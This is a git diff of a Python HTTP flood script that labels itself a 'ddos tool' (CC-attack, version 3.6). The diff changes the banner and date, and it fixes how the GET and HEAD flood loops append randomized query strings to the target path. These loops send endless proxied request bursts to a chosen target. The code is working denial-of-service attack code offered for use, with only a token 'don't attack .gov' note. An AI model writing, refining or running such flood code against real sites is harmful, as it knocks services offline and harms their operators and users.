@@ -1,8 +1,7 @@
 #!/usr/bin/python3
 #Coded by L330n123
 #########################################
-#         Let's make some fun           #
-#    Maybe change the old output back   #
+#         Just a little change          #
 #                           -- L330n123 #
 #########################################
 import requests
@@ -25,14 +24,14 @@ print ('''
 	 CC/////  CC/////   | ddos tool |/ 
 	  CCCCC/   CCCCC/   |___________|/
 >--------------------------------------------->
-Version 3.6 (2020/11/10)
+Version 3.6 (2020/11/14)
 							C0d3d by L330n123
 ┌─────────────────────────────────────────────┐
 │        Tos: Don't attack .gov website       │
 ├─────────────────────────────────────────────┤
 │                 New stuff:                  │
-|          [+] Optimization                   │
-|          [+] Changed Output                 │
+│          [+] Optimization                   │
+│          [+] Changed Output                 │
 │          [+] Added Url Parser               │
 ├─────────────────────────────────────────────┤
 │ Link: https://github.com/Leeon123/CC-attack │
@@ -292,6 +291,9 @@ def cc(event,socks_type,ind_rlock):
 	global ind_dict
 	header = GenReqHeader("get")
 	proxy = Choice(proxies).strip().split(":")
+	add = "?"
+	if "?" in path:
+		add = "&"
 	event.wait()
 	while True:
 		try:
@@ -308,7 +310,7 @@ def cc(event,socks_type,ind_rlock):
 				s = ctx.wrap_socket(s,server_hostname=target)
 			try:
 				for _ in range(multiple+1):
-					get_host = "GET " + path + "?" + randomurl() + " HTTP/1.1\r\nHost: " + target + "\r\n"
+					get_host = "GET " + path + add + randomurl() + " HTTP/1.1\r\nHost: " + target + "\r\n"
 					request = get_host + header
 					sent = s.send(str.encode(request))
 					if not sent:
@@ -327,6 +329,9 @@ def head(event,socks_type,ind_rlock):#HEAD MODE
 	global ind_dict
 	header = GenReqHeader("head")
 	proxy = Choice(proxies).strip().split(":")
+	add = "?"
+	if "?" in path:
+		add = "&"
 	event.wait()
 	while True:
 		try:
@@ -343,7 +348,7 @@ def head(event,socks_type,ind_rlock):#HEAD MODE
 				s = ctx.wrap_socket(s,server_hostname=target)
 			try:
 				for _ in range(multiple+1):
-					head_host = "HEAD " + path + "?" + randomurl() + " HTTP/1.1\r\nHost: " + target + "\r\n"
+					head_host = "HEAD " + path + add + randomurl() + " HTTP/1.1\r\nHost: " + target + "\r\n"
 					request = head_host + header
 					sent = s.send(str.encode(request))
 					if not sent:
@@ -684,7 +689,7 @@ def main():
 		event.clear()
 		input("Press Enter to continue.")
 		event.set()
-	threading.Thread(target=OutputToScreen,args=(ind_rlock,),daemon=True).start()
+		threading.Thread(target=OutputToScreen,args=(ind_rlock,),daemon=True).start()
 	while True:
 		try:
 			time.sleep(0.1)
